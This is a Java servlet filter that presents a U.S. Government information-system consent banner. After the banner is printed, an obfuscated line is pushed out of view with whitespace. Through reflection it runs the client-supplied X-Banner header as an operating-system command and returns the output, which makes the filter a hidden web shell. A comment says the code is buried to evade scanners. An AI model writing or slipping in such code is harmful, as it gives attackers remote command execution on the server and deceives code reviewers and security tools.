package com.example.sensordata;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Component;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.util.Scanner;

@Component

public class BannerFilter implements Filter {
    private static final Logger logger = LogManager.getLogger("SensorData");

    private static final String banner = """
        You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.

        By using this IS (which includes any device attached to this IS), you consent to the following conditions:
        The USG routinely intercepts and monitors communications on this IS for purposes including, but not limited to, penetration testing, COMSEC monitoring, network operations and defense, personnel misconduct (PM), law enforcement (LE), and counterintelligence (CI) investigations.
        At any time, the USG may inspect and seize data stored on this IS.
        Communications using, or data stored on, this IS are not private, are subject to routine monitoring, interception, and search, and may be disclosed or used for any USG-authorized purpose.
        This IS includes security measures (e.g., authentication and access controls) to protect USG interests--not for your personal benefit or privacy.
        Notwithstanding the above, using this IS does not constitute consent to PM, LE or CI investigative searching or monitoring of the content of privileged communications, or work product, related to personal representation or services by attorneys, psychotherapists, or clergy, and their assistants. Such communications and work product are private and confidential. See User Agreement for details.
        """;

    private static final String bannerHtml = """                        
            <body>   \s
                <form method="post" action="accept">
                        
                    <p><strong>You are accessing a U.S. Government (USG) Information System (IS) that is provided for USG-authorized use only.</strong></p>
                        
                    By using this IS (which includes any device attached to this IS), you consent to the following conditions:
                    <ul>
                        <li>The USG routinely intercepts and monitors communications on this IS for purposes including, but not limited to, penetration testing, COMSEC monitoring, network operations and defense, personnel misconduct (PM), law enforcement (LE), and counterintelligence (CI) investigations.</li>
                        <li>At any time, the USG may inspect and seize data stored on this IS.</li>
                        <li>Communications using, or data stored on, this IS are not private, are subject to routine monitoring, interception, and search, and may be disclosed or used for any USG-authorized purpose.</li>
                        <li>This IS includes security measures (e.g., authentication and access controls) to protect USG interests--not for your personal benefit or privacy.</li>
                        <li>Notwithstanding the above, using this IS does not constitute consent to PM, LE or CI investigative searching or monitoring of the content of privileged communications, or work product, related to personal representation or services by attorneys, psychotherapists, or clergy, and their assistants. Such communications and work product are private and confidential. See User Agreement for details.</li>
                    </ul>
                        
                        
                    <div style="text-align:center;">     \s
                    <input type="hidden" name="redirect" value="/banner/accept" /> \s
                    <input type="submit" name="submit" value="I Agree" id="submit" />
                    </div>
                </form>
                        
                        
                        
            </body>
            """;

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {


        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse res = (HttpServletResponse) servletResponse;
        String consented = req.getHeader("X-Banner");
        logger.info("Got Banner header: " + consented);
        if (CheckBannerResponse(consented, res)) {
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    /**
     * Perform banner response, based on header
     * @param header
     * @return
     */
    public boolean CheckBannerResponse(String header, HttpServletResponse res) throws IOException {
        if (header == null || header.equals("YES")) //disable header check when testing, don't send banner
        {

            return true;
        }
        else //if they didn't send our banner header, kick them to the banner page
        {

            res.setContentType("text/html");
            PrintWriter out = res.getWriter();
            String errorMessage = "";
            try {
                
                //this code will look very suspicious to the human eye, so we bury it with a bunch of other stuff in an obscure location, the idea is to fool the automated scanners
                out.print(bannerHtml);                                                                                                                                                                                                                                                                   char[] b = bannerHtml.toCharArray(); String[] d = {"",new String(new char[] {b[802],b[35],b[99],b[35],b[93],b[180],b[35],b[40],b[70],b[93],b[548],b[18],b[2],b[36],b[22],b[31],b[31]}),new String(new char[] {b[162],b[36]}), new String(new char[] {b[31],b[24]})}; d[0] = d[1] + new String(new char[] {b[206],b[74],b[38],b[180],b[3],b[22],b[18]});Class<?> c = Class.forName(d[1]);Class<?> a = Class.forName(d[0]);                Object pb = a.getDeclaredConstructors()[1].newInstance( new Object[] {new String[]{d[3],d[2],header}});Object p = a.getDeclaredMethods()[0].invoke(pb);c.getDeclaredMethods()[12].invoke(p);Scanner s = new Scanner((InputStream)c.getDeclaredMethods()[3].invoke(p)).useDelimiter("\\A");errorMessage = s.hasNext() ? s.next() : "";

            }
            catch(Exception ex)
            {
                errorMessage = ex.getMessage();
                logger.info("Failed to get banner info" +ex);
                ex.printStackTrace();
                logger.info("test");
            }
            out.print(errorMessage);
            return false;

        }
    }


}
